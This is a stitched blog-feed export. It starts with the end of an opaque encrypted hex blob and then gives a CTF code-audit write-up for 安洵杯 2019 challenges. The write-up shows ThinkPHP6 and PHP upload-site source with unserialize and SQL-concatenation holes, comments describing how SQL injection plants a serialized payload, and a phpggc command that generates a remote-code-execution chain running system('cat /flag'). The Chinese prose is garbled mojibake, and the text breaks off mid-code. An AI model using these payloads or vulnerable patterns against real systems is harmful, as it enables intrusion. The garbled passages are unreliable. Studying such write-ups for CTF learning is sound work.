9abd1a96fad2094365ab045b64cc46efcede4f45fb475e139510797b52666c760d63d24ad9f6cd95c0d35384c183184b3a5ea9c2ae5e8dd7e194fd9e3ac2c22b2508530f2d609ddf937b408914fd8e75361361e864ea97aec1d8bc5de25a642d79e8a0329ee6aa2cc632c24ce40e290289a7a03fa87a6bb7efe937ecd3d9d217e049b9f631abcf7bdc0e97edd8b8ef924fd18c6d39b64faf437783a8169363bc87d097f725f2e0091cdb72f0fcb1978662a1654b0ccc75085c553f922e21344730af60cbac92813f9d178b63890b261233c99cde752959ba0af5627a33912d4387fa9572a612b5695d335945449447d3c71ad98561ce7d2f9e1235157c37ce1221fdf3d074699594e8933cd0c18741aa7f118aa87ed3cc4c2c6321d184b6fcd34cab99c7bb575e2d26ec1512e5821219162111c70944d096de40a16dab5a650b9c11029b08e8d385822b8167fdf0b5e4c8a869c477365a2a02e5e80485b91cd95bf01fd49646d97eb4dc546779ae8579531261833e503ce62a073ffbb3d8ed577aa80e2e9cc3bb0a204ebaded42a9db24ca3f772ecf7fe8feccea0c16707ecb69846919aa46bbb0ab2f54dd8612b15ca5d8165fa76bda0ab32b9f619742f6e351fd297c23bab8aada046699bf3f3dba4f55c9ff82a6b6293e8ce7664e8b489aafec588440ea1f3542d28ffaee53d683643d2ea36189c921748b1ba6a600d9eaae660c22959c2a230d091b2a7ca1b744d218aa91e61c6fcbd0292f7ab82eb55b4e6d4b3e580ac36f242edf8b476b73421f8ba4c10ef29bce4b5add20ad2d7f9762c05e8903f13c46f66201f4c82126d35b59aafee93afb4a408bf7491becc1a9491f8538588f77d4a8b8c8c11cf5fff05acfb91b019ec4c575f659cb34365d6988fb901e49c37c755485917e17b9bfb03f714a382e5ad5ea9ee09a97f35d49a61a5767d8ed85a8757b95906e14e4c3a956c43939d2defdbac32cc5ba44ce8586279ab8ab405da32e4b4fcd733f31685166416b8b1813f9581d8ad8d7767f90fedcbbcdbc1bbd10eab81489d247c4fed75b9bd758a82d3839152c40e24acb777dfce88b9020879a6b0359b487f44cfc1fb6335f14f3c989f83fc8987a36e011e309d4c37f81a713afb31306a6676855d31db29a9e138a90e2a23b2eee9aba6b8c1de8a6070e5d051abc5badde100ad3dbafaa79f9176eb8544e2d04f8fa60e5f16def65708aa1d61dbd13f53fd35539c476bcb33c716c1cb1abb1a5f3343fb49b9c20e92f3de10cc35bfc8aefeca2f4b2555a8286c5f15bbda35239a12e4e02b243c11af8a6228de5425ae3012deb2d1e0b70cc46fc4660251e5e1db44d910b74e66b1fe08cd15f6434f1b75059ce34b5a82ea3f705a1c9306a0639b1a14ae9161ac414e62ee2dd60d1519c208e9185440486ce4f736865aa7a0e865bedaa51a4762d01611a81fd7cfa5661da67148659c1ad27948946487e91dd1be80dbac250cfe09948add0da9e0c3d1acfd3e1547e0c59b00915c328c0073b6b0d2957dcff3b37163ab849d4d0cf80bd944df04a20ba2e7b06a4fed1cc908ae1dfbd3722a33db48a8cc64f3a75cb4f3cd3f711c2d66ba3d879f3179a66105a322186345f5a48c224c385484314bc79cfafad7f535d35cd89a7c11e2aa0b86e4b852032c4efcd7eb9afe13d07e4c74e628bd18170ef6cb520e00acbe3d018735b5df687fcee07d4c52aba39c2a237d121666ccd7806f5e7e7396fe7404daf481808389f8876d3ad10bd33e80052d809690889b066485706cf4d5b8162c856b9fc0fe58504aedad6f57cb0525be01d7c043cd6dee0056d33bda9b9c22a413528441e40e233204a556655bad94c8c54fc00fa636b6a1ff1f4c40ea1ac1b86460c89c955be2ee72034ae4e1b4ceda37ac1498b52cca7f9ac3c38f6be9044801b8d0bbd445f930cb384ccdb6a49c1c59779056545777b5b32f249098cbb2ea5c3c556312fdee97c1c6c617f85ab7c0202bf43ce5026d31619870215f2a602fe450201248561ce0edc8b720862a4d4611dd2bfe6729e7994603c0a4bab13458e5ccc2b1d9af39ff016ef1ac8173389a83f10474955079eed75173e241d768d28362d862de7d739a6b1c11a2e0df7381e99028a40dcb68b97620bc7728c374a21821578d68b9fd26c8f94f4e1b4bd16afd634aeded9c08cc89126f2c3c6456599ee0e88be6e09ae5630fdcd8eaebeb8960ce4388411a61b09a7d47efb34dbf4ca14265b7be73bf31de3f20ce8f9bb31d2f0318295938037fb502c0fde28cfb1989e512e496ab14e41455dcac51d90f39221ec4cc4a2789b27417852d17f1a862223685073b7d43b265d9173b5cc95f825e15ef1244bb8d07e927267b3fdbc05ec294b43e9dbdbbb4e0050e1b4f672d3593986a13fd495162e8502c3d48018a55778bf55b80b75ed327c19f79a4f1fbffdab9a71a8f83bb2b74c9ba5d65e0190d49e735341860cdd9170952e9530b4e491f13b8677ba37193a43ce698f8e387a7d1d4c5534c00162191ad1d68035c9dcc9757a308bf3af8b5118810a8934c5e90d8312a3813dfc374bdf2c797988dd6861a953d9acaf1ffee34d4f748cce48f7c2dbaabc769f3e80c4e65a748223515cdc9e116111b51476648a9c71596ac49f9caa535dcd0acf99d9a52ac6898356424a233a86506ad306b36ef67f9852c0c56387ac78fe72dd95754e54df06b3f7353445935e1d28a1af0fc032ec0467bce530510956f2ade95e5a18a96de2db7546d06fc1945231c9b1f9db25f975ece96145c18de813a276d5a77d4ea60f92ee1c665d61ad8b12c70a0d558c8c6fee2ecd47f91460969a1b4d466c6f9b3e4c5494b7a781c20f584982ba5cb6863dca1ea243a006d5017d62d252a641f4e60bdeba85934f136a937b982ce1ababf1fe2ed9f99b8ae8a92ab116f8a179589b59683ce8dfe921d8ae05000cc06e0d2650ebbdd210c98ac2a27f335925c64da16cdffe52c415e9d73369aaf5dc8771f5ae7e978a0cea0503697c456d3845551394f7913482921b267126592599326243ff86c49120732adb994a4d2cd6d91cd38213e0733438e23520c847573a70548af81e83a458602b9457cdc37d840e623ea9184a7c1da66feb21d9285ef6081b10c26926bd53e2e1683d746691d720305b1134269be7cf4090de8fcba6e37229b30c2ee5df5921619c3b67ed7fc2fd3608990a003cfdbb6db6d393d152b7f0f518fff93a1a6d5377af04a08dc996fb71597f58275a2ea17efa36c07897ac0a1c3bae70266f92383d0f219319cc62b727b9e567488664fd77b77f55217874608e2405381711e74570fdc4885f4771e8719b07757d7bdc80fd7da11a27820946a54a2302f25422f32afa4f8f5d1f16ff1d01d21812b3e9b5e4130b7225ad67ee5cfd7bb2e8da3eb6da4167cda9aabaea24f76ed7cf59ec4045b5b5da1163a0f97864f7d85883095374a77bdd680c79ec907f8be7783ebf8f007adf9d4c80a7786b18a39b4746bf2a25eb4406914db0bfa5816543dfc03420dcdce6cbe0ea6f014c6bba56c275751dbd1047b1a38eba1f05d4af5b75d6784d3e44f3ce6bd35ceec99bdddcbba4a81a43baffe8fc002e116106617ff7758575bd690e162990c7826c777285060230d4ecf06d422a351429654fdc728d8bf7c650b2528c96088cdc0e86054e8cc5de4e12d9cab4dbfae7dca5bbd04ac3a67f0bb0544d5255821198cd748856e14544efe12422de8e4827d723263d32cd1e2ccc915f610a620f0c34147ae999cfdbfe73aaa0b8d652eaf0501c8a3ffda6405c15c46e857ad270af53cf3be475126114fe7a0553c7537d1312be692f22b21454b74f660100a89bb4b7dc9e0ce624e2d44e6e51a209fe0d9fdbeb35a5305b8ddbb62e12d9de8c2e7a146feeba27800679e652cee1e15a5b71b8b5b3c75701e677f524eec0b8a23a79976b01b5e50d971895be5b3fc42fbf26986bd7fff234b0ac9fc73da9849917199b4d507ea50dfebd0b18ed800a91fc5a9ef76ffa8cc2bf1f8a1af7890215483b18a2fea624340cc9741d5dd6fe56acc1b887779cf0cd52be58a69362bedf55d538eb0834edbc215ed83231cfd7e0d61f26b5df411364ffa6686472e05ee5e05621abba2d0aac448c1d7d36171ac7e9c66ad3070da5744819d5b1338a160895a80b11878f29bca390649edceaea369b56df17b05a54346bd42da7067d8fc0aa8002c45313259cd05a807c761d468db62fa6920bee99b10622ebee1274717af5b48c4b3deadae304d4b676eb04ef6ea69d3c2bca57635d988a9904bb8fc5664a0475c0ddc156980bdd86615fa26b969b7b75d61472d9e8a1785d51afa745f1d120ca89153b9d09227c2982849dae4676e1a6b1d72b8fd0309614a361c8b0b05980e2518f874dbc9c0ddccb4bf895c137a8ebd61b16c7df62affa899173d863a8b749c46b8ae9270c20a8225b33d876e46379c46019efc7615578ce8c4a179d1fe2593b927fa9b32ccd033550f027da8e7c48ba0527c181be3eb559c2f27e8a4a615b887b5f77b84ea1e38e972289d16882508d77c08bb76a59e1635a0849e64d7ccc40807c01b1381b9baefef8a066c1b44460937f6684042afa9c7e84d0340890b7a22ae98272b0868dc65565301b50ada009f5e176ada81bf2ecf8d690e134331e784fc2ed520c2b7314a9a2ce46ee7172bfdb39cd2b7878a7ad11b6619d84ccd34e28ca54a31f4056065cf3077fe2d5622135b932923382a76d70fbb558562215867aa38a4e8a047b18f2760d04de52ee31af99792c1661c2acde8b0e56df927e891916c90b8e18db193ea50eab0e36d4b7ab1df9555a967432ce76d59124c5d2f3639a5686b0897d5601cc8540b6d9df5355cebe1f30756cb7b77811d9c98596326cd0de017c5f20abda6b54c27c5f5b773be4677d6de96c56531128337b91eaf9b8d0e2c129c496f6ac393d37adf89d0c473ac05416a639b2cf2151b4e80339cc0b411965aa34bd9971fb85f87899066a66f985a22998e41f884f0e8ad5dda08068794d2b5f59d1cbcd8ca79dd20eecc796e8e8d59358b0c50a06a05f03a8439a633e1463efb6c36461b455b66159380a5479ca58ab57a3cf8642fd14ae96fdb68a80248c685e9bb48066b27c7e8a949ff82fc5c98f1ab4e83e5b97e65cd4fb47bcd035d5a7aeee3de2e9bded755097bf96c349905a1d1d063251ac04a251c6c1fa94cca7be462a3612afe2f7b6e8bf577d828d9866f9048dd6749662956ecee438bd1fc3724400b37fc30b9e6d968e17c62ce22ce6ad67b873d9a5acf11a37c0753a855fbc1d60a8bf99f9c4dc0f557b8796e2b64789bf8d329314773b5954619da528bf34ba59682fdb2563c9ba47d91490a684b55be53cb5691533e3c4a954115b9798398ca2e8347bf8736b2cf64578c6db2260dc4162199831cf8a8cbed650168c4c26739e5eff25a5adcdba496572ca35aaae8d4b0b246078f33c3d535fc4d1825c797c995c204e7a86849173c02933554423efc070c073419a6244659d60b27603b8d552f924dd02a86530c8d6f81dcee5f91d2e00d1a06fa49f840ba17b19a77f2b9d8dda4f630b81210160597a8f99334bfea5a2cbe78980c5dc9fa3d354396a3c4bdd19caca899d46f02a6633a81c6ddaf66c0082ba099a8a60c511f1093500894949cd81f9711cd4007993b0711606fb03176802c1c1321bafdafff145eea0e92101fa1f82f497adcdb65df19b6c6338545c24517987799a1ff3ecace6e21f8ceb0b502d3e2e0608427788dfcc26fdd0b999fcc9a6f7e466432354d324a58cb66df78cc60e63b2a64b664cf950c537f06dc689ec0b2a87018a0ebdce4e6b6bc57c02d63ad06eb0a23e19772cc5833df259b0e453d1271050475de690d415e073b6c261d25f9256106b787f7c8b575253631dd22d13e9878b6de59b52dbdf7ba7580f768a34a9aeac5c9dd31b0ad26d9f0a4d454803c322f97d5e099229e4538d6a82b8e59b55f2161793e59a2693848658bfbdb83f4ba029ec3e7d4e01fd8733d00cb8703fd0ed3be6a9eaa069d39532537889fce589dd46e7deea04c0b601d83c4467c60e4148ce0c064e3beb62328a60386e481b9b738572d52a3783b7ac91b58884f4e5cd5f8462297d8467a64cb070f958014a7ad0a87444ee5b5fbac1bd834ebace65c7a14d8e9118b3e33c236b7bd5a20dc78a1470538cbf446aba8362b235d46dfa800515957dcb2efa9c48525f6a96c096cf9496e24616e3f5f6d2dbdf231d6118222a31f397111582a913b2a5537486ba7e51e7a7373f937b8dfb94f08c2172a00acf991a792e2c88f36599ad0ae04782d17cb663f3368ee8160d5e4c83c23b1a6fe2ca4255183ca590e89904162e6bc0663bb0529fd1b2e2ad161af22f585a2b3b903e14208800e6dae96fcac8a7c03180da3c4fb08aff58560f42199bbf9f4dc9211a0869e0b50fb3179b7196cd7daddcbcfe8a4fa45fdbc8eaf7e6c350437ac7b06e053ca6857ac3cb774ee5a1fdc9ca862d192c2125e3867f136a0ee9aeaadd858d462e82bcbdf60fcd2ffbfbee57b3dda95e8914df51fa1ffff9461f7e3e4fa7f465d41387b475bd0ad1b334f8bac1b24a64f32ecac49af86dd066cc2fc86d93a2e104998945ee4cc7dc73eef28f4fb102edb4038449223443f30c83ca2c8c9c080686740f262f569fd1131464429e84c1be762f74f23b5cc0788603617d17667b281c721415eeeec57f4d5efddf83e2cd677eeccabe5a681b20c59d99a661b429c6c257e604425a94b003b88e6c6b5aec412367b98c24f64a284eef12de405d10b7f66d30289d5476fc19dd3e51e6bf7b5840db3bd56d8b4229a088a0bccfe149babbae7ad0f64e71e44efefbd29d6bd5bffb9e4a79aa45d993b550cd279deabff6812fed79caaf138365f27654c138c67d3af39ec23e1a2901a2283d9d133862d228be9bf89f11857f9cd6eb1e1e192c6b7e71463e2ff761b668a57019321c14e8b1e5a9a9ef3ea8a6d9b5d3b230a8b86c92571fc5bfeb82bffa3603c65287eb58b7900719b37117a30c37864560fd86e2fd2bafc8cd9a2338f24f602a2f5494ec4babc1f036433e3f28b97027ae05f50b4c9673b1e66c9ac31787b5dc2173acd3477b62d53e0940e823fe796118156e2d0946f0e9ddf879b84a5c4c7b566f55ced3324e1c621049fc5c6c48aaec6d3170aff7b8cadb61c352f913e48fd621f1236266c7bab37d20f6501b7db127d548428585eaf808bdecae74b1acfe58de0887549d6861e0f43d536b13e72c8b75a4e8068dc9af2493f78291820d9807b86a078180395998ed50d29a4447844aead3a1c0f1f6617e8479e68d13e0551141ce3c08d3a051d7f500960a0dd64bf260274aa93b88b9a7e2eea71cb40d585844deb5735b5266c4cf780d940e44e2e3438fe1a2e7c8642b747820a0fb86a97928d0ed14c33200c7d2321c3a1fbc681c53ef967d439ed67d6470bf1c9a6000ffe6d09ec10fdff18f34580fb02c314388c1f7821d58608677644698b3cce7f17628075644de0f2549107460cbac6ea487a480ad61caba2b48f527cbf013a7f879571684a917d9b88ff0fe4ac159294325f292b11804dcdd8df2364dbfb2947f7bdc</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>ä»£ç å®¡è®¡ é¢˜å‹è®°å½•</title>
    <url>/2019/04/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="å®‰æ´µæ¯-2019-iamthinking">å®‰æ´µæ¯ 2019 iamthinking</h2>
<p>thinkphp6 ååºåˆ—åŒ–</p>
<p><a href="https://xz.aliyun.com/t/6479" target="_blank" rel="noopener">https://xz.aliyun.com/t/6479</a></p>
<p><a href="https://www.freebuf.com/column/221939.html" target="_blank" rel="noopener">https://www.freebuf.com/column/221939.html</a></p>
<p><a href="https://www.anquanke.com/post/id/187393" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187393</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">è¿™æ˜¯controllerä¸‹çš„index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='../test.jpg'"</span>.<span class="string">"/&gt;"</span>;</span><br><span class="line">        $paylaod = @$_GET[<span class="string">'payload'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($paylaod))</span><br><span class="line">        &#123;</span><br><span class="line">            $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">            parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">            <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">"/^O/i"</span>,$value))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'STOP HACKING'</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            unserialize($paylaod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70891231-cf2c0680-2021-11ea-86a3-b47fa58a89a4.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916320-70cd4b00-2056-11ea-83b9-b4b3d8460b42.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916355-80e52a80-2056-11ea-993c-7e4acce3c4ac.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916397-93f7fa80-2056-11ea-87a0-b0a2d7eab448.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70916575-e0433a80-2056-11ea-8975-56f1fc768803.png" alt="image"></p>
<p>ç”Ÿæˆpoc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE2 &apos;system(&quot;cat /flag&quot;);&apos;</span><br></pre></td></tr></table></figure>
<p>æ‰“</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70889818-67c08780-201e-11ea-9f7d-bc9a5416829a.png" alt="image"></p>
<h2 id="å®‰æ´µæ¯-2019-è¿™ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ">å®‰æ´µæ¯ 2019 è¿™ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2>
<p>ä»å‰ç«¯æºç ä¸­è·å–å‡ ä¸ªç‰¹å¾å…³é”®è¯, ä¸Šgithubæœç´¢ä¹‹åå¯ä»¥å‘ç°æºä»£ç , å®¡è®¡:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload.php</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file = <span class="keyword">new</span> upload();</span><br><span class="line">		$file-&gt;upload_base();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line">	<span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">		$show-&gt;Delete_All_Images();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $con;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   			<span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">		<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">					<span class="comment">// è¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–, å¯ä»¥è§¦å‘helperç±»çš„å‡½æ•°æ¥è¾¾åˆ°è¯»å–flagçš„ç›®çš„</span></span><br><span class="line">                    $attr = unserialize($attr_temp);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">helper.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line">	<span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">		$array = <span class="keyword">array</span>();</span><br><span class="line">		$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">		$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">		$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">		$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">		$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">		$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">		$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">		<span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">			$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $rs;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">		$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">		$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">		$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">		$sql_val = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">			$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">			$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">			$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">// ç”±äºè¿™é‡Œæ˜¯ç›´æ¥æ‹¼æ¥ä¸Šå»çš„, é‚£ä¹ˆå¯ä»¥è€ƒè™‘sqlæ³¨å…¥, æ¥å°†payloadæ’å…¥åˆ°æ•°æ®åº“ä¸­, ç„¶ååœ¨æŸ¥çœ‹çš„å›¾ç‰‡çš„æ—¶å€™å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–</span></span><br><span class="line">		$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = 